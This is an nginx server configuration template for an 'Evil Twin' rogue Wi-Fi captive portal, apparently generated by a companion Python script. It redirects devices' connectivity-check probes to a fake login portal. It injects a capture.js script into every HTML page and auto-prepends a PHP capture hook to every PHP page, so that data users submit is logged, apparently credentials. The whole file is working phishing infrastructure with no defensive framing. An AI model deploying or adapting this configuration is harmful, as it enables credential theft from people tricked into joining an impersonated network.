# nginx config for Evil Twin captive portal.
# Generated by portal_server.py — do not edit manually.
# Template root: {TEMPLATE_ROOT}

server {{
    listen 80 default_server;
    listen [::]:80 default_server;

    root {TEMPLATE_ROOT};
    index index.php index.html index.htm;

    # Disable access log to reduce SD card writes
    access_log off;
    error_log /tmp/portal_nginx_error.log warn;

    # ── Capture endpoint ──────────────────────────────────────────────────────
    location = /___capture.js {{
        alias {HOOK_DIR}/capture.js;
        add_header Cache-Control "no-store";
    }}

    location = /___capture {{
        fastcgi_pass unix:{PHP_SOCK};
        fastcgi_index capture_hook.php;
        fastcgi_param SCRIPT_FILENAME {HOOK_DIR}/capture_hook.php;
        fastcgi_param CAPTURE_LOG     {LOG_FILE};
        fastcgi_param REQUEST_URI     /___capture;
        fastcgi_param REQUEST_METHOD  $request_method;
        fastcgi_param CONTENT_TYPE    $content_type;
        fastcgi_param CONTENT_LENGTH  $content_length;
        fastcgi_param REMOTE_ADDR     $remote_addr;
        fastcgi_param HTTP_USER_AGENT $http_user_agent;
        include fastcgi_params;
    }}

    # ── Captive portal detection — redirect probes to portal ─────────────────
    location = /generate_204       {{ return 302 http://$host/; }}
    location = /connecttest.txt    {{ return 302 http://$host/; }}
    location = /ncsi.txt           {{ return 302 http://$host/; }}
    location = /success.txt        {{ return 302 http://$host/; }}
    location = /hotspot-detect.html     {{ try_files $uri /index.php /index.html; }}
    location = /library/test/success.html {{ try_files $uri /index.php /index.html; }}

    # ── HTML-only templates: inject capture.js via sub_filter ─────────────────
    sub_filter '</body>' '<script src="/___capture.js"></script></body>';
    sub_filter_once on;

    # ── PHP templates ─────────────────────────────────────────────────────────
    location ~ \.php$ {{
        try_files $uri =404;
        fastcgi_pass  unix:{PHP_SOCK};
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_param CAPTURE_LOG     {LOG_FILE};
        # Auto-prepend capture hook into every PHP page
        fastcgi_param PHP_VALUE       "auto_prepend_file={HOOK_DIR}/capture_hook.php";
        include fastcgi_params;
    }}

    # ── Static assets (CSS, JS, images, fonts) ────────────────────────────────
    location ~* \.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|webp)$ {{
        expires 1h;
        add_header Cache-Control "public";
        try_files $uri =404;
    }}

    # ── Catch-all: serve template or redirect to index ────────────────────────
    location / {{
        try_files $uri $uri/ /index.php$is_args$args /index.html =200;
    }}
}}
